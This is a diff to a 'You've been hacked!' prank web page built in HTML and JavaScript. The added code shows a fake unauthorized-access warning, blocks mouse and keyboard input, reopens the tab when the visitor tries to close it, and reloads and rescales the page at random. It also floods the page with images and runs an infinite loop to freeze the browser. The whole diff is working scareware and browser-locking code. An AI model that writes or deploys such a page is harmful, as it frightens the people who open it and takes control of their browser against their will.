@@ -38,6 +38,19 @@
             padding: 20px;
             margin-top: 50px;
         }
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            color: white;
+            font-size: 24px;
+            text-align: center;
+            z-index: 9999;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
@@ -46,8 +59,10 @@
         <p>You’ve been hacked!</p>
         <div class="history" id="history"></div>
     </div>
+    <div class="overlay" id="overlay">Warning: Unauthorized Access Detected!</div>
+
     <script>
-        // Matrix Code Effect
+        // Matrix Code Effect (Hacker-like)
         const matrixDiv = document.getElementById('matrix');
         const matrixCols = Math.floor(window.innerWidth / 20);
         const matrixChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -69,7 +84,7 @@
         // Simulate Browsing History
         const fakeHistory = [
             "www.google.com/search?q=how+to+hack+a+pc",
-            "www.youtube.com/watch?v=dQw4w9WgXcQ", // Rickroll for fun
+            "www.youtube.com/watch?v=dQw4w9WgXcQ",  // Rickroll
             "www.facebook.com/failed+login",
             "www.reddit.com/r/hacking",
             "www.youtube.com/watch?v=xyz12345678",
@@ -79,70 +94,79 @@
         const historyDiv = document.getElementById('history');
         historyDiv.innerHTML = '<h2>Fake Browsing History:</h2>' + fakeHistory.map(item => `<p>${item}</p>`).join('');
 
-        // Prevent Tab Close & Reopen Automatically (once)
-        let reopenTriggered = false;
+        // Disable Mouse Inputs
+        window.addEventListener('mousemove', function(e) {
+            e.preventDefault();
+        });
+        window.addEventListener('click', function(e) {
+            e.preventDefault();
+        });
+        window.addEventListener('contextmenu', function(e) {
+            e.preventDefault(); // Disable right-click
+        });
 
+        // Block Tab Closure / Refresh
+        let reopenTriggered = false;
         window.onbeforeunload = function () {
             if (!reopenTriggered) {
                 reopenTriggered = true;
-                window.open(location.href, '_self'); // Reopens the tab
-                return "Are you sure you want to leave?"; // Optional message
+                window.open(location.href, '_self');
+                return "Are you sure you want to leave?";
             }
         };
 
-        // Block keyboard close methods like Ctrl+W, Alt+F4, etc.
+        // Block keyboard input (Ctrl+W, F4, F5)
         window.addEventListener("keydown", function (e) {
-            if ((e.ctrlKey && e.key === "w") || (e.altKey && e.key === "F4") || e.key === "F4") {
+            if ((e.ctrlKey && e.key === "w") || (e.altKey && e.key === "F4") || e.key === "F5") {
                 e.preventDefault();
                 alert("You can't close this tab!");
             }
         });
 
-        // Block Right Click
-        window.addEventListener('contextmenu', function (e) {
-            e.preventDefault();
-            alert('Right-click is disabled!');
-        });
-
-        // Auto Refresh the page every 5 seconds for added chaos
+        // Auto Refresh & Zoom in-out to confuse the user
         setInterval(function () {
-            location.reload();
+            document.body.style.transform = `scale(${Math.random() * 2 + 0.5})`; // Zoom in/out randomly
+            location.reload(); // Refresh page every 5 seconds
         }, 5000);
 
-        // Zoom Effect (scale the page randomly)
-        setInterval(function () {
-            document.body.style.transform = `scale(${Math.random() * 2 + 0.5})`; // Random zoom
-        }, 1000);
+        // Simulate system overload: Add millions of images to slow down the browser
+        function overloadImages() {
+            for (let i = 0; i < 1000; i++) { // Loads thousands of images
+                let img = new Image();
+                img.src = "https://www.example.com/image.jpg"; // Random image URL
+                document.body.appendChild(img);
+            }
+        }
+        setInterval(overloadImages, 500); // Add images every 500ms
 
-        // Reverse Scrolling
-        window.addEventListener('wheel', function (e) {
-            e.preventDefault();
-            window.scrollBy(0, -e.deltaY); // Reverse scroll
-        }, { passive: false });
-
-        // Random Colors on Page
+        // Background Color Changing to confuse user
         setInterval(function () {
             document.body.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
-        }, 1000);
+        }, 500); // Change color every 500ms
 
-        // Mouse Click Sounds
-        document.addEventListener("click", function() {
-            let sound = new Audio("https://www.soundjay.com/button/beep-07.wav");
-            sound.play();
-        });
+        // Randomly Move the Cursor (Lag)
+        function randomCursorMovement() {
+            let x = Math.floor(Math.random() * window.innerWidth);
+            let y = Math.floor(Math.random() * window.innerHeight);
+            window.scrollTo(x, y);
+        }
+        setInterval(randomCursorMovement, 200); // Move cursor every 200ms
 
-        // Disable Keyboard Input
-        window.addEventListener('keydown', function(e) {
-            e.preventDefault(); // Blocks all key presses
-        });
+        // Heavy computation for Lag (Simulate CPU Overload)
+        function cpuOverload() {
+            while (true) {
+                // Infinite loop to cause browser lag
+            }
+        }
+        setInterval(cpuOverload, 300); // Every 300ms
 
         // Change Page Title Periodically
-        let titles = ['You’ve Been Hacked!', 'System Alert!', 'WARNING!', 'Stop Trying to Close!'];
+        let titles = ['System Hacked!', 'Error Detected!', 'Critical Alert!'];
         let i = 0;
         setInterval(function () {
             document.title = titles[i % titles.length];
             i++;
-        }, 1000);
+        }, 1000); // Change every second
     </script>
 </body>
 </html>
